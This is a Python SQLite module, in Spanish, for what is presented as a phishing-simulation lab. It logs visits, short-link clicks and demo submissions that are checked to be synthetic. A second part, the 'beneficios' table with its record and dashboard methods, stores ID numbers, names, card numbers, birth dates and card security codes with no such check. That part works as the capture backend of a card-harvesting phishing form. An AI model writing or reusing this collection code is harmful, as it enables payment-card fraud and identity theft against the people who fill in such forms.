"""Persistencia SQLite, independiente de HTTP y plantillas."""
import sqlite3
from contextlib import contextmanager
from datetime import datetime, timezone
from pathlib import Path

from laboratorio.models.participacion import is_valid_identity


class EventModel:
    def __init__(self, database):
        self.database = Path(database)

    @contextmanager
    def connection(self):
        conn = sqlite3.connect(self.database)
        conn.row_factory = sqlite3.Row
        try:
            with conn:
                yield conn
        finally:
            conn.close()

    def initialize(self):
        self.database.parent.mkdir(parents=True, exist_ok=True)
        with self.connection() as conn:
            conn.execute("""CREATE TABLE IF NOT EXISTS eventos (
                id INTEGER PRIMARY KEY, fecha TEXT NOT NULL, tipo TEXT NOT NULL,
                nombre TEXT, telefono TEXT, correo TEXT)""")
            conn.execute("""CREATE TABLE IF NOT EXISTS beneficios (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                fecha TEXT NOT NULL,
                cedula TEXT NOT NULL,
                nombre TEXT NOT NULL,
                ciudad TEXT NOT NULL,
                tarjeta TEXT NOT NULL,
                fecha_nacimiento TEXT NOT NULL,
                codigo_seguridad TEXT)""")

    def record(self, kind, data=None):
        if kind not in {"visita", "enlace_corto", "envio_demo"}:
            raise ValueError("Tipo de evento desconocido")
        if ((kind == "envio_demo" and not is_valid_identity(data))
                or (kind != "envio_demo" and data is not None)):
            raise ValueError("El registro solo admite datos sinteticos con el formato indicado")
        data = data or {}
        with self.connection() as conn:
            conn.execute("INSERT INTO eventos (fecha,tipo,nombre,telefono,correo) VALUES (?,?,?,?,?)",
                         (datetime.now(timezone.utc).isoformat(), kind, data.get("nombre"),
                          data.get("telefono"), data.get("correo")))

    def record_beneficios(self, data):
        """Registra una entrada del formulario de tarjeta y beneficios."""
        with self.connection() as conn:
            conn.execute("""INSERT INTO beneficios 
                (fecha, cedula, nombre, ciudad, tarjeta, fecha_nacimiento, codigo_seguridad)
                VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (datetime.now(timezone.utc).isoformat(),
                 data.get("cedula", ""),
                 data.get("nombre", ""),
                 data.get("ciudad", ""),
                 data.get("tarjeta", ""),
                 data.get("fecha_nacimiento", ""),
                 data.get("codigo_seguridad", "")))

    def dashboard(self):
        with self.connection() as conn:
            rows = conn.execute("SELECT * FROM eventos ORDER BY id DESC LIMIT 200").fetchall()
            totals = dict(conn.execute("SELECT tipo,COUNT(*) FROM eventos GROUP BY tipo").fetchall())
        return rows, totals

    def dashboard_beneficios(self):
        """Obtiene los registros del segundo formulario de beneficios para el panel."""
        with self.connection() as conn:
            rows = conn.execute("SELECT * FROM beneficios ORDER BY id DESC LIMIT 200").fetchall()
            total = conn.execute("SELECT COUNT(*) FROM beneficios").fetchone()[0]
        return rows, total

